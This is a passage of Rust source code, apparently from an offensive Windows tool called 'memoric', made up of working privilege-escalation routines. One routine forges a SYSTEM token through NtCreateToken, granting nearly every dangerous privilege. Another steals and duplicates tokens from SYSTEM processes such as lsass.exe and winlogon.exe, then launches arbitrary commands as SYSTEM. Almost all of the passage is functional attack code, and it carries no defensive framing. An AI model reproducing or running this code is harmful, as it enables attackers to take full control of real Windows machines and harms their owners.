        let nt_create_token: NtCreateTokenFn = std::mem::transmute(func_ptr);

        // Build SYSTEM token components
        // SYSTEM SID = S-1-5-18 → 01 01 00 00 00 00 00 05 12 00 00 00
        let system_sid: [u8; 12] = [
            0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x12, 0x00, 0x00, 0x00,
        ];
        // Administrators SID = S-1-5-32-544 → 01 02 00 00 00 00 00 05 20 00 00 00 20 02 00 00
        let admin_sid: [u8; 16] = [
            0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x20, 0x00, 0x00, 0x00, 0x20, 0x02,
            0x00, 0x00,
        ];

        // SYSTEM LUID = 0x3e7
        let auth_id: u64 = 0x3e7;
        let expiration: i64 = i64::MAX; // never expire

        // TOKEN_USER { SID*, Attributes }
        let mut token_user = [0u8; 16]; // { PSID (8 bytes), DWORD Attributes (4 bytes) + padding }
        let system_sid_ptr = system_sid.as_ptr();
        (token_user.as_mut_ptr() as *mut *const u8).write(system_sid_ptr);

        // TOKEN_GROUPS with SYSTEM + Administrators + Everyone
        // Everyone SID = S-1-1-0 → 01 01 00 00 00 00 00 01 00 00 00 00
        let everyone_sid: [u8; 12] = [
            0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
        ];

        // SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY = 0x07
        const SE_GROUP_ALL: u32 = 0x07;
        // SE_GROUP_OWNER
        const SE_GROUP_OWNER: u32 = 0x08;

        let mut groups_buf = [0u8; 128]; // TOKEN_GROUPS { GroupCount, Groups[] }
        let group_count: u32 = 3;
        (groups_buf.as_mut_ptr() as *mut u32).write(group_count);
        // SID_AND_ATTRIBUTES entries at offset 8 (each 16 bytes: ptr + attrs)
        let entries = groups_buf.as_mut_ptr().add(8);
        // Group 0: SYSTEM
        (entries as *mut *const u8).write(system_sid.as_ptr());
        ((entries.add(8)) as *mut u32).write(SE_GROUP_ALL | SE_GROUP_OWNER);
        // Group 1: Administrators
        ((entries.add(16)) as *mut *const u8).write(admin_sid.as_ptr());
        ((entries.add(24)) as *mut u32).write(SE_GROUP_ALL | SE_GROUP_OWNER);
        // Group 2: Everyone
        ((entries.add(32)) as *mut *const u8).write(everyone_sid.as_ptr());
        ((entries.add(40)) as *mut u32).write(SE_GROUP_ALL);

        // TOKEN_PRIVILEGES — grant all dangerous privileges
        // struct: { PrivilegeCount: u32, Privileges: [LUID_AND_ATTRIBUTES] }
        // LUID_AND_ATTRIBUTES: { LUID: u64, Attributes: u32 }
        let privilege_luids: Vec<u64> = vec![
            2,  // SeCreateTokenPrivilege
            3,  // SeAssignPrimaryTokenPrivilege
            4,  // SeLockMemoryPrivilege
            5,  // SeIncreaseQuotaPrivilege
            7,  // SeTcbPrivilege
            8,  // SeSecurityPrivilege
            9,  // SeTakeOwnershipPrivilege
            10, // SeLoadDriverPrivilege
            11, // SeSystemProfilePrivilege
            12, // SeSystemtimePrivilege
            13, // SeProfileSingleProcessPrivilege
            14, // SeIncreaseBasePriorityPrivilege
            15, // SeCreatePagefilePrivilege
            16, // SeCreatePermanentPrivilege
            17, // SeBackupPrivilege
            18, // SeRestorePrivilege
            19, // SeShutdownPrivilege
            20, // SeDebugPrivilege
            22, // SeSystemEnvironmentPrivilege
            23, // SeChangeNotifyPrivilege
            24, // SeRemoteShutdownPrivilege
            25, // SeUndockPrivilege
            28, // SeManageVolumePrivilege
            29, // SeImpersonatePrivilege
            30, // SeCreateGlobalPrivilege
            33, // SeIncreaseWorkingSetPrivilege
            34, // SeTimeZonePrivilege
            35, // SeCreateSymbolicLinkPrivilege
        ];
        const SE_PRIVILEGE_ENABLED: u32 = 0x00000002;
        const SE_PRIVILEGE_ENABLED_BY_DEFAULT: u32 = 0x00000001;

        let priv_count = privilege_luids.len() as u32;
        // 4 bytes count + 4 padding + (12 bytes per priv: 8 LUID + 4 Attributes)
        let priv_buf_size = 8 + privilege_luids.len() * 12;
        let mut priv_buf = vec![0u8; priv_buf_size];
        (priv_buf.as_mut_ptr() as *mut u32).write(priv_count);
        for (i, &luid) in privilege_luids.iter().enumerate() {
            let entry = priv_buf.as_mut_ptr().add(8 + i * 12);
            (entry as *mut u64).write(luid);
            ((entry.add(8)) as *mut u32)
                .write(SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT);
        }

        // TOKEN_OWNER { PSID }
        let mut owner = [0u8; 8];
        (owner.as_mut_ptr() as *mut *const u8).write(system_sid.as_ptr());

        // TOKEN_PRIMARY_GROUP { PSID }
        let mut primary_group = [0u8; 8];
        (primary_group.as_mut_ptr() as *mut *const u8).write(system_sid.as_ptr());

        // TOKEN_SOURCE { "memoric\0", LUID }
        let mut source = [0u8; 16];
        source[..7].copy_from_slice(b"memoric");
        (source.as_mut_ptr().add(8) as *mut u64).write(0); // SourceIdentifier

        // OBJECT_ATTRIBUTES — zeroed (anonymous, no security descriptor)
        let obj_attrs = [0u8; 48]; // sizeof(OBJECT_ATTRIBUTES) on x64

        let mut new_token = HANDLE::default();
        let status = nt_create_token(
            &mut new_token,
            0x000F01FF, // TOKEN_ALL_ACCESS
            obj_attrs.as_ptr(),
            1, // TokenPrimary
            &auth_id,
            &expiration,
            token_user.as_ptr(),
            groups_buf.as_ptr(),
            priv_buf.as_ptr(),
            owner.as_ptr(),
            primary_group.as_ptr(),
            std::ptr::null(), // default DACL (NULL = unrestricted)
            source.as_ptr(),
        );

        if status == 0 {
            // STATUS_SUCCESS
            let new_token = SafeHandle::new(new_token);

            // Set session ID
            if session_id > 0 {
                let sid = session_id;
                let _ = windows::Win32::Security::SetTokenInformation(
                    *new_token,
                    TokenSessionId,
                    &sid as *const u32 as *const _,
                    std::mem::size_of::<u32>() as u32,
                );
            }

            let mut si = STARTUPINFOW::default();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi = PROCESS_INFORMATION::default();
            let mut cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();

            CreateProcessAsUserW(
                *new_token,
                None,
                windows::core::PWSTR(cmd.as_mut_ptr()),
                None,
                None,
                false,
                PROCESS_CREATION_FLAGS(0),
                None,
                None,
                &si,
                &mut pi,
            )
            .map_err(|e| {
                MemoricError::WindowsApi(format!("CreateProcessAsUserW with forged token: {}", e))
            })?;

            let _ph = SafeHandle::new(pi.hProcess);
            let _th = SafeHandle::new(pi.hThread);

            return Ok(serde_json::json!({
                "success": true,
                "technique": "tcb_token_forge",
                "method": "NtCreateToken",
                "target_sid": target_sid,
                "session_id": session_id,
                "privileges_granted": privilege_luids.len(),
                "groups": ["SYSTEM", "Administrators", "Everyone"],
                "new_pid": pi.dwProcessId,
                "command": command,
                "message": format!("Forged SYSTEM token via NtCreateToken with {} privileges — PID {}", privilege_luids.len(), pi.dwProcessId)
            }));
        }

        tracing::warn!(
            "[PRIVESC] NtCreateToken failed: NTSTATUS 0x{:08X}",
            status as u32
        );
    }

    Err(MemoricError::WindowsApi(
        "NtCreateToken not available or failed".to_string(),
    ))
}

/// Steal and clone SYSTEM token from a high-integrity process
unsafe fn tcb_system_steal(command: &str, session_id: u32) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, SecurityDelegation, SetTokenInformation, TokenPrimary, TokenSessionId,
        TOKEN_ACCESS_MASK, TOKEN_ALL_ACCESS,
    };
    use windows::Win32::System::Threading::{
        CreateProcessAsUserW, OpenProcess, OpenProcessToken, PROCESS_CREATION_FLAGS,
        PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION, STARTUPINFOW,
    };

    // Enable all helpful privileges
    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    // Try multiple SYSTEM processes
    let system_procs = [
        "winlogon.exe",
        "lsass.exe",
        "services.exe",
        "wininit.exe",
        "csrss.exe",
        "smss.exe",
    ];

    for proc_name in &system_procs {
        if let Some(pid) = find_process_pid(proc_name) {
            let process = match OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) {
                Ok(p) => p,
                Err(_) => continue,
            };
            let process = SafeHandle::new(process);

            let mut token = HANDLE::default();
            if OpenProcessToken(*process, TOKEN_ACCESS_MASK(0x000F01FF), &mut token).is_err() {
                continue;
            }
            let token = SafeHandle::new(token);

            // Use SecurityDelegation for maximum impersonation level
            let mut primary = HANDLE::default();
            if DuplicateTokenEx(
                *token,
                TOKEN_ALL_ACCESS,
                None,
                SecurityDelegation,
                TokenPrimary,
                &mut primary,
            )
            .is_err()
            {
                continue;
            }
            let primary = SafeHandle::new(primary);

            // Set session ID
            if session_id > 0 {
                let sid = session_id;
                let _ = SetTokenInformation(
                    *primary,
                    TokenSessionId,
                    &sid as *const u32 as *const _,
                    std::mem::size_of::<u32>() as u32,
                );
            }

            let mut si = STARTUPINFOW::default();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi = PROCESS_INFORMATION::default();
            let mut cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();

            if CreateProcessAsUserW(
                *primary,
                None,
                windows::core::PWSTR(cmd.as_mut_ptr()),
                None,
                None,
                false,
                PROCESS_CREATION_FLAGS(0),
                None,
                None,
                &si,
                &mut pi,
            )
            .is_ok()
            {
                let _ph = SafeHandle::new(pi.hProcess);
                let _th = SafeHandle::new(pi.hThread);

                return Ok(serde_json::json!({
                    "success": true,
                    "technique": "tcb_system_steal",
                    "source_process": proc_name,
                    "source_pid": pid,
                    "session_id": session_id,
                    "new_pid": pi.dwProcessId,
                    "command": command,
                    "message": format!("Stole SYSTEM token from {} (PID {}), spawned PID {}", proc_name, pid, pi.dwProcessId)
                }));
            }
        }
    }

    Err(MemoricError::WindowsApi(
        "Failed to steal token from any SYSTEM process".to_string(),
    ))
}

/// Helper: find PID by process name
unsafe fn find_process_pid(name: &str) -> Option<u32> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
    let mut pe = PROCESSENTRY32W::default();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

    if Process32FirstW(snap, &mut pe).is_ok() {
        loop {
            let pname = String::from_utf16_lossy(&pe.szExeFile)
                .trim_end_matches('\0')
                .to_lowercase();
            if pname == name.to_lowercase() {
                let _ = windows::Win32::Foundation::CloseHandle(snap);
                return Some(pe.th32ProcessID);
            }
            if Process32NextW(snap, &mut pe).is_err() {
                break;
            }
        }
    }
    let _ = windows::Win32::Foundation::CloseHandle(snap);
    None
}

fn hex_decode(hex: &str) -> Result<Vec<u8>, MemoricError> {
    let hex = hex.trim_start_matches("0x").replace(' ', "");
    if hex.len() % 2 != 0 {
        return Err(MemoricError::WindowsApi("Invalid hex length".to_string()));
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(&hex[i..i + 2], 16)
                .map_err(|_| MemoricError::WindowsApi("Invalid hex".to_string()))
        })
        .collect()
}
